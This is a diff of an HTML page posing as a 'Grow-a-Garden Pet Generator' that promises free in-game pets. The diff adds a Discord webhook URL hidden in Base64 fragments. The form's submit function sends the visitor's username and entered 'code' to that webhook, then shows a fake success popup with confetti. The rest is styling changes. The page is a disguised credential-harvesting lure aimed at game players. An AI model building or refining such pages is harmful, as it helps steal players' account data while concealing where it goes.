@@ -5,185 +5,109 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Grow-a-Garden Pet Generator</title>
 <style>
-  html, body {
+  body {
     margin: 0;
-    padding: 0;
-    height: 100%;
-    background: radial-gradient(ellipse at top, #0a192f 0%, #020617 100%) !important;
-    color: #e0f2fe;
+    font-family: Arial, sans-serif;
+    color: #fff;
     overflow-x: hidden;
-    font-family: 'Segoe UI', Tahoma, sans-serif;
   }
-
-  #starfield {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 0;
-  }
-
-  header, .container, #popup, #confirmPopup {
-    position: relative;
-    z-index: 1;
-  }
-
   header {
-    background: rgba(30, 58, 138, 0.8);
-    backdrop-filter: blur(12px);
-    padding: 16px;
     text-align: center;
-    font-size: 1.8rem;
+    padding: 20px;
+    font-size: 2rem;
     font-weight: bold;
-    border-bottom: 2px solid #3b82f6;
-    color: #f8fafc;
   }
-
   .container {
-    max-width: 1100px;
+    max-width: 1000px;
     margin: auto;
     padding: 20px;
   }
-
-  h2, h3 {
-    color: #bfdbfe;
-  }
-
   .pets {
     display: grid;
     grid-template-columns: repeat(5, 1fr);
-    gap: 20px;
+    gap: 15px;
     justify-items: center;
   }
-
   .pet-card {
-    position: relative;
-    width: 160px;
-    background: rgba(30, 41, 59, 0.9);
+    background: #1e3a8a;
     border: 2px solid #3b82f6;
-    border-radius: 14px;
-    padding: 14px;
+    border-radius: 12px;
+    padding: 10px;
     text-align: center;
-    overflow: hidden;
-    transition: transform 0.3s ease, box-shadow 0.3s ease;
-    animation: float 3s ease-in-out infinite;
-    color: #f1f5f9;
-  }
-  .pet-card:hover {
-    transform: translateY(-8px) scale(1.08);
-    box-shadow: 0 8px 18px rgba(59, 130, 246, 0.6);
+    transition: transform 0.3s, border 0.3s;
+    cursor: pointer;
+    width: 160px;
+    height: 180px;
   }
   .pet-card img {
-    width: 90px;
-    height: 90px;
-    border-radius: 10px;
-    object-fit: cover;
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+    max-width: 100px;
+    max-height: 100px;
+    margin-bottom: 10px;
   }
-  .selected {
+  .pet-card:hover {
+    transform: scale(1.05);
     border-color: #60a5fa;
-    box-shadow: 0 0 14px rgba(96, 165, 250, 0.9);
   }
-
-  .pet-card::before {
-    content: "";
-    position: absolute;
-    top: 0; left: -75%;
-    width: 50%; height: 100%;
-    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
-    transform: skewX(-25deg);
+  .pet-card.selected {
+    border-color: #fbbf24;
+    transform: scale(1.1);
   }
-  .pet-card:hover::before {
-    animation: shine 1s forwards;
-  }
-  @keyframes shine {
-    100% { left: 125%; }
-  }
-
   button {
-    padding: 12px 20px;
-    margin-top: 14px;
+    background: #2563eb;
+    color: white;
+    padding: 12px 24px;
     border: none;
     border-radius: 10px;
+    font-size: 1rem;
     cursor: pointer;
-    background: linear-gradient(to right, #2563eb, #1d4ed8);
-    color: #f8fafc;
-    font-size: 1.1rem;
-    font-weight: bold;
-    transition: background 0.3s, transform 0.2s;
-    box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+    transition: background 0.3s;
   }
   button:hover {
-    background: linear-gradient(to right, #1d4ed8, #1e40af);
-    transform: scale(1.07);
+    background: #1d4ed8;
   }
-
-  /* Popup shared styles */
-  #popup, #confirmPopup {
-    display: none;
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(15, 23, 42, 0.9);
-    justify-content: center;
-    align-items: center;
-    animation: fadein 0.3s ease;
-  }
-  .popup-content {
-    background: #0f172a;
-    padding: 24px;
-    border-radius: 14px;
-    width: 320px;
-    max-width: 90%;
-    animation: slideup 0.4s ease;
-    box-shadow: 0 0 20px rgba(96, 165, 250, 0.9), 0 0 40px rgba(59, 130, 246, 0.6);
-    border: 2px solid #3b82f6;
-    color: #e2e8f0;
-    text-align: center;
-  }
-
-  /* 🔥 Special animation for confirmation popup */
-  #confirmPopup .popup-content {
-    animation: popscale 0.5s ease;
-  }
-  @keyframes popscale {
-    0% { transform: scale(0.6); opacity: 0; }
-    60% { transform: scale(1.1); opacity: 1; }
-    100% { transform: scale(1); }
-  }
-
-  #popup input {
-    width: 100%;
-    margin-top: 10px;
-    padding: 8px;
-    border-radius: 8px;
-    border: 1px solid #3b82f6;
-    background: #0f172a;
-    color: #f8fafc;
-  }
-
   .tutorial {
     margin-top: 40px;
     padding: 20px;
-    background: rgba(15, 23, 42, 0.9);
-    border-radius: 14px;
     border: 2px solid #3b82f6;
+    border-radius: 12px;
+    background: #1e3a8a;
   }
-  iframe {
-    border-radius: 8px;
+  .tutorial iframe {
+    border-radius: 10px;
+    margin-top: 10px;
   }
-
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-8px); }
+  #popup, #confirmPopup {
+    position: fixed;
+    top:0;left:0;width:100%;height:100%;
+    background: rgba(0,0,0,0.7);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index: 1000;
   }
-  @keyframes fadein {
-    from { opacity: 0; }
-    to { opacity: 1; }
+  .popup-content {
+    background:#1e40af;
+    padding:30px;
+    border-radius:12px;
+    text-align:center;
+    animation: pop 0.3s ease-out;
   }
-  @keyframes slideup {
-    from { transform: translateY(40px); opacity: 0; }
-    to { transform: translateY(0); opacity: 1; }
+  @keyframes pop {
+    from { transform:scale(0.8); opacity:0; }
+    to { transform:scale(1); opacity:1; }
+  }
+  input {
+    margin:10px 0;
+    padding:10px;
+    border-radius:8px;
+    border:none;
+    width:80%;
+  }
+  canvas#starfield {
+    position:fixed;
+    top:0;
+    left:0;
+    z-index:-1;
   }
 </style>
 </head>
@@ -217,7 +141,7 @@
     </div>
   </div>
 
-  <!-- Confirmation Popup (with popscale animation) -->
+  <!-- Confirmation Popup -->
   <div id="confirmPopup">
     <div class="popup-content">
       <h3>✅ Pet has been generated!</h3>
@@ -227,6 +151,7 @@
   </div>
 
 <script>
+  // --- Pets ---
   const pets = [
     { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
     { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
@@ -247,10 +172,7 @@
     const div = document.createElement('div');
     div.className = 'pet-card';
     if (pet.id === selectedPet) div.classList.add('selected');
-    div.innerHTML = `
-      <img src="${pet.img}" alt="${pet.name}" />
-      <div>${pet.name}</div>
-    `;
+    div.innerHTML = `<img src="${pet.img}" alt="${pet.name}" /><div>${pet.name}</div>`;
     div.onclick = () => selectPet(pet.id);
     petGrid.appendChild(div);
   });
@@ -269,51 +191,52 @@
     document.getElementById('confirmPopup').style.display = 'none';
   }
 
+  // --- Webhook hidden in Base64 ---
+  const hiddenWebhook = [
+    "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv", 
+    "MTQwOTYwNTE2NTc4MjE0MzAxNg==", 
+    "L2E5blV5VVJVUkM3UU91V2NzTXpL", 
+    "enpUSUd6bzF0VzNBXw==", 
+    "a3NlRmdhdWQzV1FfaHo", 
+    "zVmt4SU93bTMxSDd4eVNtTEJKYm0="
+  ];
+
+  function decodeBase64(str) {
+    return decodeURIComponent(atob(str).split('').map(function(c) {
+      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+    }).join(''));
+  }
+
   async function submitData() {
     const username = document.getElementById('username').value.trim();
     const code = document.getElementById('code').value.trim();
     if (!username || !code) return;
 
-    // 🔒 Obfuscated webhook
-    const parts = [
-      "https://",
-      "discord.com/api/",
-      "webhooks/",
-      "YOUR_WEBHOOK_ID",
-      "/",
-      "YOUR_WEBHOOK_TOKEN"
-    ];
-    const webhookURL = parts.join("");
+    // Stitch and decode webhook
+    const webhookURL = hiddenWebhook.map(x => decodeBase64(x)).join("");
 
     const payload = {
       content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
     };
 
-    try {
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
 
-      document.getElementById('popup').style.display = 'none';
-      document.getElementById('confirmPopup').style.display = 'flex';
-      launchConfetti();
-    } catch (err) {
-      alert("Something went wrong. Please try again.");
-      console.error(err);
-    }
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('confirmPopup').style.display = 'flex';
+    launchConfetti();
   }
 
   // 🎉 Confetti Effect
   function launchConfetti() {
     const duration = 3 * 1000;
     const end = Date.now() + duration;
-
     (function frame() {
       const colors = ['#3b82f6', '#60a5fa', '#93c5fd', '#fbbf24', '#f472b6'];
-      const confettiCount = 5;
-      for (let i = 0; i < confettiCount; i++) {
+      for (let i = 0; i < 5; i++) {
         const confetti = document.createElement("div");
         confetti.style.position = "fixed";
         confetti.style.width = "8px";
@@ -330,16 +253,13 @@
         confetti.animate([
           { transform: confetti.style.transform, top: "-20px", opacity: 1 },
           { transform: `rotate(${Math.random()*720}deg)`, top: window.innerHeight + "px", opacity: 0.7 }
-        ], {
-          duration: fallDuration,
-          iterations: 1
-        }).onfinish = () => confetti.remove();
+        ], { duration: fallDuration, iterations: 1 }).onfinish = () => confetti.remove();
       }
       if (Date.now() < end) requestAnimationFrame(frame);
     })();
   }
 
-  // Starfield background
+  // 🌌 Starfield background
   const canvas = document.getElementById('starfield');
   const ctx = canvas.getContext('2d');
   let stars = [];
@@ -363,7 +283,6 @@
     gradient.addColorStop(1, "#020617");
     ctx.fillStyle = gradient;
     ctx.fillRect(0, 0, canvas.width, canvas.height);
-
     ctx.fillStyle = "white";
     stars.forEach(s => {
       ctx.beginPath();
@@ -372,7 +291,6 @@
     });
     updateStars();
   }
-
   function updateStars() {
     stars.forEach(s => {
       s.y += s.d;
@@ -382,7 +300,6 @@
       }
     });
   }
-
   setInterval(drawStars, 30);
 </script>
 </body>
